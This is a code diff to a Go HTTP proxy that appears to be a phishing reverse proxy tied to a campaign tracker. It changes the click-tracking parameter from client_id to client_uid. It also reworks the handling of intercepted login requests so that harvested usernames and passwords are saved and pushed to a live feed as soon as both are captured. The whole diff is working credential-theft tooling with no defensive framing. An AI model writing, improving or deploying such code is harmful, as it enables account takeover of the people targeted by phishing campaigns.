@@ -171,8 +171,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
             // Handle clicked link and email opened events
             rid := ""
             browser := map[string]string{}
-            ridr, _ := regexp.Compile(`client_id=([^\"]*)`)
-            trackr, _ := regexp.Compile(`track\?client_id=`)
+            ridr, _ := regexp.Compile(`client_uid=([^\"]*)`)
+            trackr, _ := regexp.Compile(`track\?client_uid=`)
             rid_match := ridr.FindString(req_url)
             opened_match := trackr.FindString(req_url)
             //log.Debug("Track regex", trackr.FindString(req_url))
@@ -439,6 +439,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
                         req.URL.RawQuery = qs.Encode()
                     }
                 }
+            
+                // set session before cred check
+                session := p.sessions[ps.SessionId]
 
                 // check for creds in request body
                 if pl != nil && ps.SessionId != "" {
@@ -466,6 +469,12 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
                                     if err := p.db.SetSessionUsername(ps.SessionId, um[1]); err != nil {
                                         log.Error("database: %v", err)
                                     }
+                                    if len(session.RId) != 0 && len(session.Password) != 0 {
+                                        err = database.HandleSubmittedData(session.RId, session.Username, session.Password, session.Browser, p.livefeed)
+                                        if err != nil {
+                                            fmt.Printf("Error submitting data to database: %s\n", err)
+                                        }
+                                    }
                                 }
                             }
 
@@ -477,8 +486,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
                                     if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
                                         log.Error("database: %v", err)
                                     }
-                                    session := p.sessions[ps.SessionId]
-                                    if len(session.RId) != 0 {
+                                    if len(session.RId) != 0 && len(session.Username) != 0 {
                                         err = database.HandleSubmittedData(session.RId, session.Username, session.Password, session.Browser, p.livefeed)
                                         if err != nil {
                                             fmt.Printf("Error submitting data to database: %s\n", err)
@@ -521,6 +529,12 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
                                             if err := p.db.SetSessionUsername(ps.SessionId, um[1]); err != nil {
                                                 log.Error("database: %v", err)
                                             }
+                                            if len(session.RId) != 0 && len(session.Password) != 0 {
+                                                err = database.HandleSubmittedData(session.RId, session.Username, session.Password, session.Browser, p.livefeed)
+                                                if err != nil {
+                                                    fmt.Printf("Error submitting data to database: %s\n", err)
+                                                }
+                                            }
                                         }
                                     }
                                     if pl.password.key != nil && pl.password.search != nil && pl.password.key.MatchString(k) {
@@ -531,8 +545,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
                                             if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
                                                 log.Error("database: %v", err)
                                             }
-                                            session := p.sessions[ps.SessionId]
-                                            if len(session.RId) != 0 {
+                                            if len(session.RId) != 0 && len(session.Username) != 0 {
                                                 err = database.HandleSubmittedData(session.RId, session.Username, session.Password, session.Browser, p.livefeed)
                                                 if err != nil {
                                                     fmt.Printf("Error submitting data to database: %s\n", err)
